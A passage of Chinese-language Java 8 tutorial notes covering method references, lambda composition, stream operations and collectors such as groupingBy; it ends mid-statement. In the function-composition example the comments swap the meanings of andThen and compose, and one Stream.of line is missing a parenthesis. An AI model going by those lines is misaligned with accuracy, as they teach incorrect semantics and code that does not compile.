<pre class="line-numbers language-java" data-language="java"><code class="language-java">inventory<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token function">comparing</span><span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token operator">::</span><span class="token function">getWeight</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>方法引用主要有三类:</p>
<ul>
<li>指向静态方法的方法引用: Integer::parseInt</li>
<li>指向任意类型实例方法的方法引用: String::length</li>
<li>指向现有对象的实例方法的方法引用: expensiveTransaction::getValue</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//改写</span>
<span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> stringToInteger <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> stringToInteger <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">parseInt</span><span class="token punctuation">;</span>

<span class="token class-name">BiPredicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> contains <span class="token operator">=</span> <span class="token punctuation">(</span>list<span class="token punctuation">,</span> element<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BiPredicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> contains <span class="token operator">=</span> <span class="token class-name">List</span><span class="token operator">::</span><span class="token function">contains</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="复合Lambda表达式-因为引入了默认方法">复合Lambda表达式 (因为引入了默认方法)</h3>
<h4 id="1-比较器复合">1. 比较器复合</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Apple</span><span class="token punctuation">&gt;</span></span> c <span class="token operator">=</span> <span class="token class-name">Comparator</span><span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token operator">::</span><span class="token function">getWeight</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 逆序</span>
inventory<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token function">comparing</span><span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token operator">::</span><span class="token function">getWeight</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reversed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 比较器链</span>
inventory<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token function">comparing</span><span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token operator">::</span><span class="token function">getWeight</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">reversed</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">thenComparing</span><span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token operator">::</span><span class="token function">getCountry</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="2-谓词复合-negate、and和or">2. 谓词复合 <code>negate</code>、<code>and</code>和<code>or</code></h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//取非</span>
<span class="token class-name">Predicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Apple</span><span class="token punctuation">&gt;</span></span> notRedApple <span class="token operator">=</span> redApple<span class="token punctuation">.</span><span class="token function">negate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//and操作</span>
<span class="token class-name">Predicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Apple</span><span class="token punctuation">&gt;</span></span> redAndHeavyApple <span class="token operator">=</span> redApple<span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span>a <span class="token operator">-&gt;</span> a<span class="token punctuation">.</span><span class="token function">getWeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//and + or操作</span>
<span class="token class-name">Predicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Apple</span><span class="token punctuation">&gt;</span></span> redAndHeavyAppleOrGreen <span class="token operator">=</span> redApple<span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span>a <span class="token operator">-&gt;</span> a<span class="token punctuation">.</span><span class="token function">getWeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">or</span><span class="token punctuation">(</span>a <span class="token operator">-&gt;</span> <span class="token string">"green"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">getColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从左向右确定优先级.</p>
<h4 id="3-函数复合">3. 函数复合</h4>
<p>Function提供了<code>andThen()</code>, <code>compose()</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> f <span class="token operator">=</span> x <span class="token operator">-&gt;</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> 
<span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> g <span class="token operator">=</span> x <span class="token operator">-&gt;</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> 
<span class="token comment">// expect: (2 + 1) * 2 = 4</span>
<span class="token comment">// f(g(x))</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">andThen</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// expect: 1 * 2 + 1 = 3</span>
<span class="token comment">// g(f(x))</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">compose</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>复合Lambda表达式可以用来创建各种转型流水线。</p>
<h1>Stream定义</h1>
<p>从（支持数据处理操作的源）生成的（元素序列）</p>
<p>元素序列：流提供了一个接口,可以访问特定元素类型的一组有序值。<br>
源：集合、数组或输入/输出资源<br>
数据处理操作：filter 、 map 、 reduce 、 find 、 match 、 sort等，可顺序，可并行。<br>
两个重要特点：</p>
<ul>
<li>流水线：多个操作可以链接起来</li>
<li>内部迭代：流的迭代操作是在背后进行的，优点：透明地并行处理;优化处理顺序<br>
注意：链中的方法调用都在排队等待,直到调用 collect 。</li>
</ul>
<h1>Stream操作</h1>
<h2 id="概念">概念</h2>
<p>两大类操作<br>
1. 中间操作：会返回另一个流，map，filter等<br>
2. 终端操作：从流的流水线生成结果，collect，foreach， count等<br>
使用三要素<br>
+ 一个数据源(如集合)来执行一个查询;<br>
+ 一个中间操作链,形成一条流的流水线;<br>
+ 一个终端操作,执行流水线,并能生成结果。</p>
<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">dishes.stream()
    .filter(d -&gt; d.getCalories() &lt; 400)
    .sorted(comparing(Dish::getCalories))
    .map(Dish::getName)
    .collect(toList());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="常用函数">常用函数</h2>
<ol>
<li>
<p>筛选和切片 Filtering and slicing<br>
<code>filter()</code>，<code>distinct()</code>，<code>limit(n)</code>, <code>skip(n)</code></p>
</li>
<li>
<p>映射 Mapping</p>
<ul>
<li>map: 对流中每一个元素应用函数</li>
<li>flatmap: 把一个流中的每个值都换成另一个流,然后把所有的流连接起来成为一个流。</li>
</ul>
</li>
<li>
<p>查找和匹配 Finding and matching</p>
<ul>
<li>anyMatch: 流中是否有一个元素能匹配给定的谓词, 方法返回一个 boolean</li>
<li>allMatch: 流中的元素是否都能匹配给定的谓词, 方法返回一个 boolean</li>
<li>noneMatch: 流中没有任何元素与给定的谓词匹配</li>
<li>findAny: 返回当前流中的任意元素(Optional)</li>
<li>findFirst: 找到第一个元素</li>
</ul>
</li>
<li>
<p>归约 Reducing<br>
将流中所有元素反复结合起来。</p>
<ul>
<li>元素求和</li>
</ul>
</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> sum <span class="token operator">=</span> numbers<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">sum</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> sum <span class="token operator">=</span> numbers<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">sum</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>最大值，最小值</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> max <span class="token operator">=</span> numbers<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">max</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> min <span class="token operator">=</span> numbers<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">min</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol start="5">
<li>数值流 Numeric Streams<br>
为了避免装箱带来的复杂性</li>
</ol>
<ul>
<li>映射到数值流: mapToInt、mapToDouble 和 mapToLong</li>
<li>转换回对象流</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">IntStream</span> intStream <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mapToInt</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getCalories</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> stream <span class="token operator">=</span> intStream<span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>默认值 OptionalInt 、 OptionalDouble 和 OptionalLong</li>
<li>数值范围 IntStream.rangeClosed(1, 100)</li>
</ul>
<ol start="6">
<li>
<p>构建流 Building streams</p>
<ol>
<li>由值创建流：</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> stream <span class="token operator">=</span> <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Java 8 "</span><span class="token punctuation">,</span> <span class="token string">"Lambdas "</span><span class="token punctuation">,</span> <span class="token string">"In "</span><span class="token punctuation">,</span> <span class="token string">"Action"</span><span class="token punctuation">;</span>
stream<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">toUpperCase</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//空流</span>
<span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> emptyStream <span class="token operator">=</span> <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>2. 由数组创建流
</code></pre>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>numbers<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre><code>3. 由文件生成流
</code></pre>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> uniqueWords <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">lines</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Charset</span><span class="token punctuation">.</span><span class="token function">defaultCharset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>line <span class="token operator">-&gt;</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="4">
<li>由函数生成流:创建无限流</li>
</ol>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"> <span class="token comment">// iterate</span>
<span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-&gt;</span> n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">limit</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// generate</span>
<span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token operator">::</span><span class="token function">random</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">limit</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>用stream收集数据</h1>
<h2 id="常用的收集器">常用的收集器</h2>
<h3 id="Collectors-reducing：广义的归约汇总">Collectors.reducing：广义的归约汇总</h3>
<p>需要三个参数：</p>
<ul>
<li>归约操作的起始值</li>
<li>获取或操作对象的属性数值(转换函数)</li>
<li>BinaryOperator，如加法</li>
</ul>
<p>举例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> totalCalories <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">reducing</span><span class="token punctuation">(</span>
    <span class="token number">0</span><span class="token punctuation">,</span>                      <span class="token comment">// 归约操作的起始值</span>
    <span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getCalories</span><span class="token punctuation">,</span>      <span class="token comment">// 获取或操作对象的属性数值(转换函数)</span>
    <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// BinaryOperator，如加法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Collectors-groupingBy-：分组">Collectors.groupingBy ：分组</h3>
<ul>
<li>一级分组</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dish<span class="token punctuation">.</span>Type</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Dish</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> dishesByType <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getType</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 自定义分组</span>
<span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">CaloricLevel</span> <span class="token punctuation">{</span> <span class="token constant">DIET</span><span class="token punctuation">,</span> <span class="token constant">NORMAL</span><span class="token punctuation">,</span> <span class="token constant">FAT</span> <span class="token punctuation">}</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CaloricLevel</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Dish</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> dishesByCaloricLevel <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">groupingBy</span><span class="token punctuation">(</span>dish <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>dish<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">400</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">DIET</span><span class="token punctuation">;</span>
                    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dish<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">700</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">NORMAL</span><span class="token punctuation">;</span>
                    <span class="token keyword">else</span>
                        <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">FAT</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>多级分组</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getType</span><span class="token punctuation">,</span>
            <span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Dish</span> dish<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>dish<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">400</span><span class="token punctuation">)</span> 
                    <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">DIET</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dish<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">700</span><span class="token punctuation">)</span> 
                    <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">NORMAL</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span> 
                    <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">FAT</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>与 groupingBy 联合使用的其他收集器<br>
有时候在groupBy的时候，我们还想做一下其他操作，比如设定返回类型，或者只取对象中的某个属性。</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// summingInt</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dish<span class="token punctuation">.</span>Type</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> totalCaloriesByType <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getType</span><span class="token punctuation">,</span> <span class="token function">summingInt</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getCalories</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// mapping</span>
menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getType</span><span class="token punctuation">,</span> <span class="token function">mapping</span><span class="token punctuation">(</span>dish <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>dish<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">400</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">DIET</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dish<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">700</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">NORMAL</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token keyword">return</span> <span class="token class-name">CaloricLevel</span><span class="token punctuation">.</span><span class="token constant">FAT</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token function">toSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//按子组收集数据</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dish<span class="token punctuation">.</span>Type</span><span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> typesCount <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>
    <span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getType</span><span class="token punctuation">,</span> <span class="token function">counting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//Collectors.collectingAndThen： 把收集器返回的结果转换为另一种类型</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dish<span class="token punctuation">.</span>Type</span><span class="token punctuation">,</span> <span class="token class-name">Dish</span><span class="token punctuation">&gt;</span></span> mostCaloricByType <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
